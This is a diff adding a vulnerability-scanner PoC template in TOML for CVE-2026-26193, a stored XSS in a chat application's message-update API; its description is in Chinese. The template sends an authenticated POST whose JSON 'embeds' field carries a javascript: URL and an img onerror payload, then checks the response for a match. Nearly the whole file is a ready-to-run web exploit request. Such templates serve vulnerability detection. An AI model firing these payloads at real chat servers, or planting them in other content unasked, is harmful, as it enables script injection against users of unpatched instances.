@@ -1,0 +1,33 @@
+[info]
+author = "AVE"
+description = "通过修改聊天历史记录中的 embeds 属性，在响应消息中注入恶意 iFrame 内容，利用 allow-scripts 和 allow-same-origin 沙箱权限绕过实现存储型 XSS"
+id = "POC-AVE-2026-0253"
+name = "CVE-2026-26193 PoC"
+severity = "high"
+tags = ["ave-2026-0253"]
+vuln_id = [
+    "CVE-2026-26193",
+    "AVE-2026-0253",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/chat/{{chat_id}}/message/{{message_id}}/update"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"embeds": [{"url": "javascript:alert(document.domain)", "title": "XSS", "description": "<img src=x onerror=alert(1)>"}]}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["embeds"]
